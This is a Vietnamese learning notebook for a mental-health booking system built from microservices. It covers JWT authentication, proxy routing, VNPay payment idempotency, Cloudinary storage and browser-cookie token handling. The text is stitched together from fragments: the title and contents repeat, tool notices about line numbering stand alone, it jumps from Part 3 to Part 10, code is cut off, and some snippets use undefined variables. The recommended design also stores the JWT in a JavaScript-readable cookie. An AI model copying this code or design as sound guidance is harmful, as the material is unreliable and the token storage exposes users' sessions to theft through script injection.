# Sổ Tay Học Tập & Kiến Thức Toàn Diện Hệ Thống (MindBridge OPCBS - Master Learn & Architecture Guide)
## Phân Tích Chuyên Sâu Theo Cấp Bậc Hệ Thống: DÙNG GÌ - TẠI SAO - HỌC ĐƯỢC GÌ

Tài liệu này tổng hợp chi tiết toàn bộ các kiến thức, bài học kinh nghiệm, nguyên lý kỹ thuật, cách giải quyết sự cố và phương pháp luận thiết kế phần mềm mà chúng ta đã tiếp thu và áp dụng xuyên suốt quá trình phát triển dự án **MindBridge OPCBS** (Hệ thống 8 Microservices Y Tế & Chăm Sóc Sức Khỏe Tâm Thần).

---

## 📑 MỤC LỤC TỔNG HỢP KIẾN THỨC THEO CẤP BẬC HỆ THỐNG

- [Phần 1: Kiến Trúc 8 Microservices & Phân Tách Domain (DDD) Theo 6 Cấp Bậc](#phần-1-kiến-trúc-8-microservices--phân-tách-domain-ddd-theo-6-cấp-bậc)
  - [Cấp 0: Infrastructure & Discovery (Eureka, Kafka, Redis, MySQL)](#cấp-0-infrastructure--discovery-layer)
  - [Cấp 1: Identity & Gateway (IAM, OTP, Proxy Routing)](#cấp-1-identity--access-management-iam--gateway-layer)
  - [Cấp 2: Core Clinical Business (Booking, Clinical Records)](#cấp-2-core-clinical--appointment-booking-business-layer)
  - [Cấp 3: Supportive Treatment (Treatment Packages, Psychometrics)](#cấp-3-supportive-treatment--longitudinal-mental-health-care-layer)
  - [Cấp 4: Engagement & Payments (Notifications, VNPay, Messaging)](#cấp-4-engagement-real-time-messaging--payment-gateway-layer)
  - [Cấp 5: Presentation UI (Angular 19 Standalone, High-Contrast Design System)](#cấp-5-user-interface--high-contrast-angular-19-spa-presentation-layer)
- [Phần 2: Kiến Trúc Hướng Sự Kiện (Event-Driven Architecture với Apache Kafka)](#phần-2-kiến-trúc-hướng-sự-kiện-event-driven-architecture-với-apache-kafka)
- [Phần 3: Cơ Chế Bảo Mật & Xác Thực Phân Tán (Decentralized Stateless JWT 256/512-bit)](#phần-3-cơ-chế-bảo-mật--xác-thực-phân-tán-decentralized-stateless-jwt-256512-bit)
- [Phần 4: Cơ Chế Điều Phối API Reverse Proxy Gateway (proxy.config.mjs)](#phần-4-cơ-chế-điều-phối-api-reverse-proxy-gateway-proxyconfigmjs)
- [Phần 5: Chi Tiết Nghiệp Vụ Từng Microservice & Cách Hoạt Động (8 Services)](#phần-5-chi-tiết-nghiệp-vụ-từng-microservice--cách-hoạt-động)
- [Phần 6: Lập Trình Frontend Angular 19 Hiện Đại (Standalone & Signals State)](#phần-6-lập-trình-frontend-angular-19-hiện-đại-standalone--signals-state)
- [Phần 7: Hướng Dẫn Debug, Tracing Request & Troubleshooting Lỗi](#phần-7-hướng-dẫn-debug-tracing-request--troubleshooting-lỗi)
- [Phần 8: Kỹ Thuật Xử Lý Deadlock, Debug Thread Dump jcmd & Phòng Chống Bế Tắc](#phần-8-kỹ-thuật-xử-lý-deadlock-debug-thread-dump-jcmd--phòng-chống-bế-tắc)
- [Phần 9: Luồng Đặt Lịch Hẹn Chống Double-Booking](#phần-9-luồng-đặt-lịch-hẹn-chống-double-booking)
- [Phần 10: Quản Lý Giao Dịch & Idempotency Trong Payment Service (VNPay Sandbox)](#phần-10-quản-lý-giao-dịch--idempotency-trong-payment-service-vnpay-sandbox)
- [Phần 11: Tối Ưu Hóa Hiệu Năng Doctor Dashboard Với Redis Cache & Giao Diện Sắc Nét](#phần-11-tối-ưu-hóa-hiệu-năng-doctor-dashboard-với-redis-cache--giao-diện-sắc-nét)
- [Phần 12: Phân Lập Dữ Liệu Bác Sĩ & Trải Nghiệm Người Dùng Đa Phương Tiện](#bài-12-phân-lập-dữ-liệu-bác-sĩ-doctor-dashboard-scoping--trải-nghiệm-người-dùng-đa-phương-tiện)
- [Phần 13: Cơ Chế Quản Lý JWT Token & Browser Cookie: Kiến Trúc Xác Thực Kép (Dual Storage)](#bài-13-cơ-chế-quản-lý-jwt-token--browser-cookie-kiến-trúc-xác-thực-kép-dual-storage--cookie-fallback-strategy)
- [Phần 14: Đóng Gói Toàn Diện 8 Microservices Bằng Docker & Giải Pháp Triển Khai Cloud 0 VNĐ](#bài-14-đóng-gói-toàn-diện-8-microservices-bằng-docker--giải-pháp-triển-khai-cloud-0-vnđ)
- [Phần 18: Nâng Cấp Toàn Diện Module Quản Trị Hệ Thống Dành Riêng Cho Role [Admin]](#phần-18-nâng-cấp-toàn-diện-module-quản-trị-hệ-thống-dành-riêng-cho-role-admin-business-manager-service-packages-psychometrics-upload-engine--total-view-dashboard-with-interactive-svg-diagrams)
- [Phần 19: Chuẩn Hóa Dữ Liệu Toàn Diện Không Dùng Rawdata (Zero Rawdata & Live Database Metrics Architecture)](#phần-19-chuẩn-hóa-dữ-liệu-toàn-diện-không-dùng-rawdata-zero-rawdata--normalized-live-database-metrics-architecture)
- [Phần 20: Nâng Cấp Bảo Mật Toàn Diện JWT: Chuyển Đổi Sang RSA RS256 & Chuẩn Hóa JWKS RFC 7517](#bài-20-nâng-cấp-bảo-mật-toàn-diện-jwt-chuyển-đổi-từ-hs512-sang-rsa-rs256--chuẩn-hóa-jwks-rfc-7517)

---

## Phần 1: Kiến Trúc Microservices & Phân Tách Domain (DDD)

### 1.1. Bản Chất Của Việc Chuyển Đổi Từ Monolith Sang Microservices
* **Monolith (Nguyên khối)**: Toàn bộ module (User, Auth, Doctor, Appointment, Journal, Psychometrics) gói gọn trong 1 file `.jar` duy nhất.
  * *Hạn chế*: Bất kỳ lỗi nhỏ nào ở module phụ (ví dụ: nghẽn mạng khi gửi mail OTP) có thể làm tê liệt toàn bộ hệ thống đặt lịch khám; khó scale riêng lẻ từng tính năng có tải cao.
* **Microservices (Đa dịch vụ độc lập)**: Tách hệ thống theo các **Bounded Context** (Ranh giới ngữ cảnh) rõ ràng:
  1. **`opcbs-auth-service` (Port 8081)**: Bounded context về *Identity & Access Management (IAM)*.
  2. **`opcbs-core-service` (Port 8082)**: Bounded context về *Clinical Healthcare & Patient Booking Management*.

```mermaid
graph LR
    Client["🌐 Client (Angular SPA :9000)"] --> Gateway["🚪 Proxy Gateway"]
    Gateway -- "Auth/Account/Users" --> S1["🔐 opcbs-auth-service (:8081)"]
    Gateway -- "Doctor/Appointments/Clinical" --> S2["🏥 opcbs-core-service (:8082)"]
    S1 --> DB1[("🗄️ MySQL: jhi_user, authorities")]
    S2 --> DB2[("🗄️ MySQL: clinical records, slots")]
```

### 1.2. Tại Sao Tách Như Vậy? (Lợi Ích Thực Tế Đã Học)
1. **Khả năng mở rộng độc lập (Independent Scalability)**:
   - Trong thực tế, số lượt tra cứu danh sách bác sĩ, xem slot rảnh và đặt lịch khám cao gấp $10 - 20$ lần số lượt người dùng đăng ký hoặc đăng nhập.
   - Khi lượng truy cập tăng đột biến (ví dụ: giờ mở đặt lịch đầu tuần), ta chỉ cần cấp thêm tài nguyên RAM/CPU hoặc chạy nhiều instance cho `opcbs-core-service` mà không cần nhân bản `opcbs-auth-service`.
2. **Cô lập lỗi (Fault Isolation)**:
   - Nếu `opcbs-auth-service` bị chậm hoặc nghẽn hàng đợi gửi email OTP, các bác sĩ và bệnh nhân đã đăng nhập trên `opcbs-core-service` vẫn tiến hành khám, duyệt ca và viết chẩn đoán hoàn toàn bình thường.
3. **Bảo mật & Tuân thủ y tế (Compliance & Security)**:
   - Tách biệt vùng dữ liệu nhạy cảm (mật khẩu người dùng, token đăng nhập) khỏi dữ liệu lâm sàng y tế, giúp hệ thống dễ dàng đáp ứng các tiêu chuẩn bảo mật y tế như **HIPAA** và **GDPR**.

---

## Phần 2: Cơ Chế Bảo Mật & Xác Thực Phân Tán (Decentralized Stateless JWT)

```
[Angular Client]
       │
       ├── 1. POST /api/authenticate ──────────────> [Auth Service :8081]
       │                                                    │
       │<── 2. Trả JWT Token (Signed with Secret Key) ──────┘
       │
       └── 3. GET /api/doctor/my-patients + Bearer Token ──> [Core Service :8082]
The following code has been modified to include a line number before every line, in the format: <line_number>: <original_line>. Please note that any changes targeting the original code should remove the line number, colon, and leading space.
# Sổ Tay Học Tập & Kiến Thức Đã Tích Lũy (MindBridge OPCBS - Master Learn & Knowledge Log)

Tài liệu này tổng hợp chi tiết toàn bộ các kiến thức, bài học kinh nghiệm, nguyên lý kỹ thuật, cách giải quyết sự cố và phương pháp luận thiết kế phần mềm mà chúng ta đã tiếp thu và áp dụng xuyên suốt quá trình phát triển dự án **MindBridge OPCBS**.

---

## 📑 MỤC LỤC TỔNG HỢP KIẾN THỨC

- [Phần 1: Kiến Trúc Microservices & Phân Tách Domain (DDD)](#phần-1-kiến-trúc-microservices--phân-tách-domain-ddd)
- [Phần 2: Cơ Chế Bảo Mật & Xác Thực Phân Tán (Decentralized Stateless JWT)](#phần-2-cơ-chế-bảo-mật--xác-thực-phân-tán-decentralized-stateless-jwt)
- [Phần 3: Thiết Kế API Reverse Proxy Gateway Điều Phối Thông Minh](#phần-3-thiết-kế-api-reverse-proxy-gateway-điều-phối-thông-minh)
- [Phần 4: Quản Trị Cơ Sở Dữ Liệu MySQL Với DBeaver & Liquibase Migration](#phần-4-quản-trị-cơ-sở-dữ-liệu-mysql-với-dbeaver--liquibase-migration)
- [Phần 5: Lập Trình Frontend Hiện Đại Với Angular 19 & Signals Reactive State](#phần-5-lập-trình-frontend-hiện-đại-với-angular-19--signals-reactive-state)
- [Phần 6: Thiết Kế Hệ Thống Nghiệp Vụ Y Tế Chuyên Sâu (Clinical Workflow)](#phần-6-thiết-kế-hệ-thống-nghiệp-vụ-y-tế-chuyên-sâu-clinical-workflow)
- [Phần 7: Nhật Ký Giải Quyết Lỗi & Tối Ưu Hóa Hệ Thống (Troubleshooting Case Studies)](#phần-7-nhật-ký-giải-quyết-lỗi--tối-ưu-hóa-hệ-thống-troubleshooting-case-studies)
  - [Mục 7.1: Phân quyền dữ liệu - Bác sĩ chỉ xem bệnh nhân của mình](#mục-71-phân-quyền-dữ-liệu---bác-sĩ-chỉ-xem-bệnh-nhân-của-mình)
  - [Mục 7.2: Bảo mật bệnh án - Ẩn ghi chú chẩn đoán chéo giữa các bác sĩ](#mục-72-bảo-mật-bệnh-án---ẩn-ghi-chú-chẩn-đoán-chéo-giữa-các-bác-sĩ)
  - [Mục 7.3: Ràng buộc thời gian thực - Chặn tạo slot và đặt lịch trong quá khứ](#mục-73-ràng-buộc-thời-gian-thực---chặn-tạo-slot-và-đặt-lịch-trong-quá-khứ)

---

## Phần 1: Kiến Trúc Microservices & Phân Tách Domain (DDD)

### 1.1. Bản Chất Của Việc Chuyển Đổi Từ Monolith Sang Microservices
* **Monolith (Nguyên khối)**: Toàn bộ module (User, Auth, Doctor, Appointment, Journal, Psychometrics) gói gọn trong 1 file `.jar` duy nhất.
  * *Hạn chế*: Bất kỳ lỗi nhỏ nào ở module phụ (ví dụ: nghẽn mạng khi gửi mail OTP) có thể làm tê liệt toàn bộ hệ thống đặt lịch khám; khó scale riêng lẻ từng tính năng có tải cao.
* **Microservices (Đa dịch vụ độc lập)**: Tách hệ thống theo các **Bounded Context** (Ranh giới ngữ cảnh) rõ ràng:
  1. **`opcbs-auth-service` (Port 8081)**: Bounded context về *Identity & Access Management (IAM)*.
  2. **`opcbs-core-service` (Port 8082)**: Bounded context về *Clinical Healthcare & Patient Booking Management*.

```mermaid
graph LR
    Client["🌐 Client (Angular SPA :9000)"] --> Gateway["🚪 Proxy Gateway"]
    Gateway -- "Auth/Account/Users" --> S1["🔐 opcbs-auth-service (:8081)"]
    Gateway -- "Doctor/Appointments/Clinical" --> S2["🏥 opcbs-core-service (:8082)"]
    S1 --> DB1[("🗄️ MySQL: jhi_user, authorities")]
    S2 --> DB2[("🗄️ MySQL: clinical records, slots")]
```

### 1.2. Tại Sao Tách Như Vậy? (Lợi Ích Thực Tế Đã Học)
1. **Khả năng mở rộng độc lập (Independent Scalability)**:
   - Trong thực tế, số lượt tra cứu danh sách bác sĩ, xem slot rảnh và đặt lịch khám cao gấp $10 - 20$ lần số lượt người dùng đăng ký hoặc đăng nhập.
   - Khi lượng truy cập tăng đột biến (ví dụ: giờ mở đặt lịch đầu tuần), ta chỉ cần cấp thêm tài nguyên RAM/CPU hoặc chạy nhiều instance cho `opcbs-core-service` mà không cần nhân bản `opcbs-auth-service`.
2. **Cô lập lỗi (Fault Isolation)**:
   - Nếu `opcbs-auth-service` bị chậm hoặc nghẽn hàng đợi gửi email OTP, các bác sĩ và bệnh nhân đã đăng nhập trên `opcbs-core-service` vẫn tiến hành khám, duyệt ca và viết chẩn đoán hoàn toàn bình thường.
3. **Bảo mật & Tuân thủ y tế (Compliance & Security)**:
   - Tách biệt vùng dữ liệu nhạy cảm (mật khẩu người dùng, token đăng nhập) khỏi dữ liệu lâm sàng y tế, giúp hệ thống dễ dàng đáp ứng các tiêu chuẩn bảo mật y tế như **HIPAA** và **GDPR**.

---

## Phần 2: Cơ Chế Bảo Mật & Xác Thực Phân Tán (Decentralized Stateless JWT)

```
[Angular Client]
       │
       ├── 1. POST /api/authenticate ──────────────> [Auth Service :8081]
       │                                                    │
       │<── 2. Trả JWT Token (Signed with Secret Key) ──────┘
       │
       └── 3. GET /api/doctor/my-patients + Bearer Token ──> [Core Service :8082]
                                                                    │
                                                             4. Tự giải mã Token tại chỗ
                                                                (In-Memory < 1ms)
                                                                -> Xác thực User & Role
                                                                -> Trả dữ liệu bệnh án!
```

### 2.1. Điểm Khác Biệt Cốt Lõi: Centralized vs Decentralized Auth
* **Mô hình Tập trung (Centralized - Kém tối ưu)**: Mỗi khi `Core Service` nhận request, nó phải gửi HTTP call sang `Auth Service` để hỏi *"Token này có hợp lệ không?"*.
  * *Hậu quả*: Tăng độ trễ mạng (Network Latency), tạo thắt nút cổ chai (Bottleneck), nếu Auth Service quá tải thì Core Service chết theo.
* **Mô hình Phân tán (Decentralized Stateless - Chúng ta áp dụng)**:
  * Hai service sử dụng chung một khóa bí mật (**Shared Secret Key** - chuẩn HMAC-SHA512).
  * `opcbs-auth-service` đóng vai trò là **Token Issuer** (Ký và cấp phát JWT chứa `sub: username` và `auth: ROLE_...`).
  * `opcbs-core-service` tích hợp **Stateless Security Filter Chain**, tự giải mã payload của token ngay trong bộ nhớ RAM trong thời gian $< 1\text{ms}$.
  * Hàm `SecurityUtils.getCurrentUserLogin()` và `SecurityUtils.hasCurrentUserAnyOfAuthorities()` hoạt động trơn tru trên `Core Service` mà không cần truy vấn bảng tài khoản người dùng (`jhi_user`).

---

## Phần 3: Thiết Kế API Reverse Proxy Gateway Điều Phối Thông Minh

### 3.1. Nhiệm Vụ Của Reverse Proxy
* Trong môi trường SPA (Single Page Application), Client chỉ cần kết nối đến một địa chỉ duy nhất (`http://localhost:9000`).
* Proxy Gateway đứng ở giữa, kiểm tra đường dẫn URL (URI Pattern) và chuyển tiếp trong suốt (transparent reverse proxy) đến service đích phía sau.

### 3.2. Cấu Hình Hoàn Chỉnh Trong `proxy.config.mjs`
```javascript
const authHost = '127.0.0.1';
const authPort = 8081;

const coreHost = '127.0.0.1';
const corePort = 8082;

export default {
  // 1. Phân luồng API định danh & tài khoản -> Auth Service (Port 8081)
  '^/api/(authenticate|register|register-doctor|account|users|admin/users|authorities)': {
    target: `http://${authHost}:${authPort}`,
    changeOrigin: true,
    xfwd: true,
  },

The following code has been modified to include a line number before every line, in the format: <line_number>: <original_line>. Please note that any changes targeting the original code should remove the line number, colon, and leading space.
- **Rủi ro lớn nhất**:
  - VNPay có cơ chế tự động **Retry Webhook** nếu mạng bị chậm (gửi lại sau $15s, 30s, 60s$).
  - Bệnh nhân/Bác sĩ có thể bấm **F5 Reload trang kết quả** nhiều lần.
  - **Hậu quả nếu KHÔNG có Idempotency**:
    - Gói dịch vụ 30 ngày bị cộng dồn thành 60, 90 ngày (Thất thoát tài chính nghiêm trọng).
    - Tiền trong tài khoản bị cộng nhiều lần.
    - Bắn trùng lặp hàng loạt Email & SMS.

### 10.2. Code (Các Thành Phần Triển Khai)

#### A. Mã nguồn Kiểm Tra Chữ Ký HMAC-SHA512 ([`VnPayUtil.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-payment-service/src/main/java/com/ocbs/service/util/VnPayUtil.java))
```java
// Sắp xếp các tham số theo thứ tự alphabet và tính mã băm HMAC-SHA512 với secret key
public static boolean verifyCallbackSignature(Map<String, String> vnpParams) {
    String secureHash = vnpParams.get("vnp_SecureHash");
    Map<String, String> paramsToHash = new HashMap<>(vnpParams);
    paramsToHash.remove("vnp_SecureHash");
    paramsToHash.remove("vnp_SecureHashType");

    String calculatedHash = hashAllFields(paramsToHash);
    return secureHash.equalsIgnoreCase(calculatedHash);
}
```

#### B. Khóa Bi Quan & Idempotency Guard ([`PaymentResource.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-payment-service/src/main/java/com/ocbs/web/rest/PaymentResource.java))
```java
@GetMapping("/payments/vnpay/callback")
@Transactional(isolation = Isolation.READ_COMMITTED)
public ResponseEntity<Map<String, Object>> vnpayCallback(@RequestParam Map<String, String> allParams) {
    String txnCode = allParams.get("vnp_TxnRef");
    
    // 1. Kiểm tra chữ ký bảo mật
    if (!VnPayUtil.verifyCallbackSignature(allParams)) {
        return ResponseEntity.badRequest().body(Map.of("RspCode", "97", "Message", "Invalid Checksum"));
    }

    // 2. Khóa dòng bản ghi với Pessimistic Lock (SELECT FOR UPDATE)
    PaymentTransaction txn = transactionRepository.findByTransactionCodeWithLock(txnCode)
        .orElseThrow(() -> new BadRequestAlertException("Transaction not found", ENTITY_NAME, "txnotfound"));
    DoctorSubscription sub = subscriptionRepository.findByTransactionCode(txnCode)
        .orElseThrow(() -> new BadRequestAlertException("Subscription not found", ENTITY_NAME, "subnotfound"));

    // 3. IDEMPOTENCY GUARD: Nếu giao dịch ĐÃ THÀNH CÔNG, trả về kết quả ngay mà KHÔNG cộng lặp ngày
    if ("SUCCESS".equals(txn.getPaymentStatus())) {
        return ResponseEntity.ok(Map.of(
            "RspCode", "00",
            "isIdempotentReplay", true,
            "status", "ACTIVE",
            "expirationDate", sub.getExpirationDate().toString()
        ));
    }

    // 4. Cập nhật trạng thái thành công lần đầu tiên
    txn.setPaymentStatus("SUCCESS");
    sub.setStatus("ACTIVE");
    sub.setExpirationDate(Instant.now().plus(pkg.getDurationDays(), ChronoUnit.DAYS));
    
    transactionRepository.save(txn);
    subscriptionRepository.save(sub);
    return ResponseEntity.ok(Map.of("isIdempotentReplay", false, "status", "ACTIVE", ...));
}
```

### 10.3. Run (Thực Thi Demo Tự Động)
File chạy thực tế: [`demo_payment_idempotency.ps1`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/demo_payment_idempotency.ps1).
```powershell
powershell -ExecutionPolicy Bypass -File .\demo_payment_idempotency.ps1
```

### 10.4. Debug (Kỹ Thuật Đặt Breakpoint & SQL Log)
- **Breakpoint 1** tại `PaymentResource.java:180`: Kiểm tra `verifyCallbackSignature` $\to$ Xác thực chữ ký VNPay.
- **Breakpoint 2** tại `PaymentResource.java:191`: Kiểm tra câu truy vấn `SELECT ... FOR UPDATE` trong Hibernate SQL console.
- **Breakpoint 3** tại `PaymentResource.java:197`: Xem `if ("SUCCESS".equals(txn.getPaymentStatus()))` kích hoạt trên lần gọi thứ 2.
- **Tra cứu MySQL**:
  ```sql
  SELECT id, transaction_code, amount, payment_status, paid_at FROM payment_transaction WHERE transaction_code = 'VNP...';
  SELECT id, doctor_login, status, start_date, expiration_date FROM doctor_subscription WHERE transaction_code = 'VNP...';
  ```

### 10.5. Break it (Phá Vỡ Hệ Thống Nếu Thiếu Idempotency)
- Giả lập VNPay bắn 3 webhook IPN đồng thời trong cùng 1 giây.
- Nếu không có `isIdempotentReplay` và `SELECT FOR UPDATE`:
  - Mỗi request cộng thêm 30 ngày vào `expiration_date` $\to$ Bác sĩ nhận được 90 ngày sử dụng nhưng chỉ trả tiền 1 tháng!

### 10.6. Fix it (Các Lớp Bảo Vệ Chuẩn Enterprise)
1. **Lớp 1: Unique Database Constraint**:
   ```sql
   ALTER TABLE payment_transaction ADD CONSTRAINT uk_payment_txn_code UNIQUE (transaction_code);
   ```
2. **Lớp 2: Pessimistic Lock (`LockModeType.PESSIMISTIC_WRITE`)**:
   Ngăn chặn 2 request đồng thời cùng đọc và cùng thực thi logic kích hoạt.
3. **Lớp 3: Idempotency Key & State Guard**:
   Kiểm tra trạng thái thực thể trước khi thực hiện bất kỳ phép tính toán cộng dồn nào.

### 10.7. Explain it (Mẫu Trả Lời Chuẩn Phỏng Vấn Senior/Lead)
> *"Trong Payment Service, tính lũy đẳng (Idempotency) là bắt buộc vì các cổng thanh toán như VNPay, Stripe luôn có cơ chế retry webhook khi mạng chập chờn. Ta hiện thực Idempotency bằng 3 lớp: (1) Khóa dòng giao dịch bằng Pessimistic Lock (`SELECT FOR UPDATE`), (2) Kiểm tra trạng thái giao dịch nếu đã `SUCCESS` thì lập tức trả về kết quả thành công mà không cộng dồn thời hạn hay bắn lại sự kiện, (3) Bọc toàn bộ thao tác cập nhật `PaymentTransaction` và `DoctorSubscription` trong 1 khối `@Transactional(isolation = Isolation.READ_COMMITTED)` để đảm bảo tính nguyên tử (Atomicity)."*

### 10.8. Quản Lý Gói Dịch Vụ & Lịch Sử Giao Dịch Bác Sĩ (Status, Smart Renewal & History)
Tham khảo nguyên bản từ kiến trúc C# (`Pages/Doctor/Subscriptions/Status.cshtml` và `History.cshtml`), hệ thống cung cấp giao diện quản trị 3 tab toàn diện cho Bác sĩ:
1. **Tab 1: Gói Hiện Tại (Current Plan - Status)**:
   - **4 Thông số Grid Lâm sàng**: Ngày kích hoạt (`startDate`), Hạn đăng ký (`expirationDate`), Ngày giao dịch (`createdDate`), và Thời gian còn lại (`daysRemaining`).
   - **Thanh Tiến Độ Sử Dụng (Progress Bar)**: Trực quan hóa % thời gian đã sử dụng của gói (`progressPct = usedDays / totalDays * 100`).
   - **Cảnh báo Sắp Hết Hạn Thông Minh**: Khi số ngày còn lại $\le 7$ ngày, hệ thống kích hoạt banner màu vàng y tế (`#fffbeb`, viền `#fde68a`, chữ `#92400e`) nhắc nhở gia hạn để không bị gián đoạn tiếp nhận ca khám mới.
   - **Gia Hạn Thông Minh (Smart Extension)**:
     - Nếu gói cũ vẫn còn hạn (`oldExp > now`), hạn mới được tính: `newExp = oldExp.plus(durationDays, DAYS)`.
     - Bác sĩ được **bảo toàn 100% số ngày còn lại** mà không bị mất ngày sử dụng.
2. **Tab 2: Lịch Sử Giao Dịch & Đăng Ký (History)**:
   - Thống kê tóm tắt: Tổng số lượt đăng ký, Tổng chi phí đầu tư dịch vụ, Trạng thái hiệu lực hiện tại.
   - Bộ lọc trạng thái đa năng: Tất cả, Đang dùng (`ACTIVE`), Đã gia hạn (`EXTENDED`), Đã hết hạn (`EXPIRED`), Chờ thanh toán (`PENDING_PAYMENT`).
   - Bảng lịch sử chi tiết cho máy tính & Thẻ Card cho thiết bị di động với đầy đủ mã hợp đồng `#SUB-XXXX`, mã giao dịch VNPay, chu kỳ sử dụng và nút xem chi tiết.
3. **Tab 3: Bảng Giá & Đổi Gói Mới (Plans)**:
   - Khám phá các gói dịch vụ từ Cơ bản đến Phòng khám chuyên sâu, tích hợp thanh toán bảo mật tức thời qua VNPay Sandbox.

---

# [BÀI 11] Kiến Trúc Tin Nhắn Y Tế Bảo Mật & Lưu Trữ File Trên Cloudinary

### 11.1. Understand (Mục Tiêu & Thách Thức)
- **Vấn đề lưu file trên Disk trong Microservices**:
  - Khi triển khai đa container/pod trong Kubernetes hoặc Docker Swarm, lưu file trên ổ đĩa cục bộ khiến các pod khác không thể đọc được (Stateful Pod issue).
  - Khắc phục bằng cách lưu trữ toàn bộ ảnh đại diện và chứng chỉ lên **Cloudinary Cloud Storage**.
- **Quy trình gửi tin nhắn y tế**:
  - Tin nhắn y tế phải đảm bảo tính bất biến (Immutable), ghi lại chính xác thời gian (`sentAt`), vai trò người gửi (`senderRole`) và đánh dấu trạng thái đã đọc (`isRead`).

### 11.2. Code (Triển Khai Lưu Trữ Đám Mây & Tin Nhắn)
```java
// 1. Tải ảnh lên Cloudinary
public Map<String, Object> uploadAvatarToCloud(byte[] fileBytes, String originalFilename, Long userId) throws IOException {
    Map<String, Object> uploadParams = ObjectUtils.asMap(
        "folder", "opcbs/avatars",
        "public_id", "user_" + userId + "_" + System.currentTimeMillis(),
        "resource_type", "image"
    );
    return cloudinary.uploader().upload(fileBytes, uploadParams);
}

// 2. Tự động liên kết hội thoại bác sĩ - bệnh nhân
@PostMapping("/conversations/start")
public ResponseEntity<Conversation> startConversation(@RequestBody StartConversationRequest req) {
    // Tự động giải quyết hoặc tạo mới cuộc trò chuyện giữa doctorId và patientId
    Conversation conv = conversationService.getOrCreateConversation(doctorId, patientId);
    return ResponseEntity.ok(conv);
}
```

---

# [BÀI 12] Phân Lập Dữ Liệu Bác Sĩ (Doctor Dashboard Scoping) & Trải Nghiệm Người Dùng Đa Phương Tiện

### 12.1. Phân Lập Dữ Liệu Thực Tế
- Trước đây, Dashboard hiển thị một số giá trị mặc định giả lập (`Math.max(..., 12)`).
- Giải pháp: Truy vấn trực tiếp từ bảng `appointment` theo `doctor_profile_id = :doctorId` để đếm chính xác số bệnh nhân duy nhất, số ca hoàn thành và doanh thu thực tế theo biểu phí của chính bác sĩ đó.

### 12.2. Video Streaming Trên Banner Trang Chủ
- Trực tiếp stream video phong cảnh thiên nhiên êm dịu từ Cloud CDN thay vì đọc file tĩnh trên ổ cứng máy chủ:
```html
<video class="hero-video-bg" autoplay loop muted playsinline>
  <source src="https://assets.mixkit.co/videos/preview/mixkit-forest-stream-in-the-sunlight-529-large.mp4" type="video/mp4" />
</video>
```
- Kết hợp với lớp phủ kính mờ (`backdrop-filter: blur(4px)`) và 100% tiếng Việt chuẩn y khoa, mang lại trải nghiệm êm dịu, tin cậy và chuyên nghiệp cho người dùng.

---

# [BÀI 13] Cơ Chế Quản Lý JWT Token & Browser Cookie: Kiến Trúc Xác Thực Kép (Dual Storage & Cookie Fallback Strategy)

### 13.1. Understand (Mục Tiêu, Khái Niệm Cốt Lõi & Thách Thức)
- **Bản Chất Của JWT Token (JSON Web Token)**:
  - Chuỗi mã hóa Base64URL cấu trúc 3 phần: `Header.Payload.Signature`.
    - **Header**: Xác định thuật toán mã hóa (VD: `{"alg": "HS512", "typ": "JWT"}`).
    - **Payload**: Tập hợp các **Claims** định danh: `sub` (tên đăng nhập), `auth` (chuỗi danh sách quyền: `ROLE_PATIENT ROLE_DOCTOR`), `user_id` (ID người dùng trong bảng `jhi_user`), `exp` (thời điểm hết hạn epoch seconds).
    - **Signature**: Chữ ký điện tử sinh ra bởi `opcbs-auth-service` từ `HMACSHA512(base64Url(header) + "." + base64Url(payload), secretKey)`.
  - **Tính chất Stateless**: Các microservice khác (`opcbs-booking-service`, `opcbs-clinical-service`...) chỉ cần nạp cùng `secretKey` (hoặc public key) là có thể tự kiểm tra tính hợp lệ của token và trích xuất danh tính/quyền hạn trong microsecond mà **KHÔNG CẦN** gọi API ngược lại `opcbs-auth-service` hay tra cứu database.
- **Bản Chất Của Cookie Trình Duyệt**:
  - Dữ liệu `key=value` được trình duyệt lưu trữ trên máy client theo Domain và Path.
  - Cơ chế tự động: Trình duyệt tự động đính kèm header `Cookie: name=value; ...` vào mọi HTTP request gửi đến cùng host/proxy.
  - Các thuộc tính bảo mật quan trọng:
    - `Path=/`: Cookie có hiệu lực trên toàn bộ router và endpoint của trang web.
    - `SameSite=Lax`: Cho phép gửi cookie khi người dùng điều hướng liên trang thông thường (GET navigation), nhưng chặn gửi trong các cross-site POST ngầm (bảo vệ chống tấn công CSRF).
    - `Max-Age` / `Expires`: Xác định tuổi thọ cookie (30 ngày nếu `rememberMe = true`, hoặc session cookie biến mất khi tắt trình duyệt nếu `rememberMe = false`).
- **Thách Thức & Lý Do Lựa Chọn Chiến Lược Xác Thực Kép (Hybrid Dual-Storage)**:
  - *Nếu chỉ lưu ở `localStorage`*: Token không tự động gửi qua header Cookie khi trình duyệt tải tài nguyên trực tiếp (như file PDF hóa đơn, thẻ iframe, SSR); dễ bị mã độc JavaScript đọc trộm nếu có lỗ hổng XSS.
  - *Nếu chỉ lưu ở `sessionStorage`*: Mỗi khi người dùng bấm chuột giữa mở link sang **Tab mới** trong trình duyệt, `sessionStorage` không được chia sẻ giữa các tab độc lập $\to$ người dùng bị văng ra trang Login, trải nghiệm bị gián đoạn nặng nề!
  - *Nếu chỉ dùng `HttpOnly Cookie`*: JavaScript frontend Angular SPA không thể đọc được token $\to$ không thể giải mã thông tin hiển thị tên người dùng trên giao diện hay gắn linh hoạt vào các request WebSocket / Custom HTTP client.
  - **$\Rightarrow$ Giải Pháp Hybrid Của MindBridge OPCBS**:
    1. **Tầng Backend Auth Service**: Khi đăng nhập thành công (`/api/authenticate`), server trả JWT trong response body (`{ id_token: "..." }`) và đồng thời gắn luôn header `Set-Cookie: jhi-authenticationToken=...; Path=/; SameSite=Lax`.
    2. **Tầng Frontend Angular**: Lưu token vào `localStorage`/`sessionStorage` (tùy cờ `rememberMe`), đồng thời ghi vào `document.cookie` (`jhi-authenticationToken` và `id_token`).
    3. **Cơ chế Fallback Recovery**: Hàm `getAuthenticationToken()` ưu tiên đọc Web Storage, nếu Web Storage trống (ví dụ người dùng mở tab mới) sẽ tự động phục hồi từ `Cookie`.
    4. **Dọn sạch khi Logout**: `clearAuthenticationToken()` xóa triệt để cả trong `localStorage`, `sessionStorage` và set cookie hết hạn ở quá khứ (`expires=1970-01-01`).

```mermaid
sequenceDiagram
    autonumber
    actor User as 👤 Người Dùng
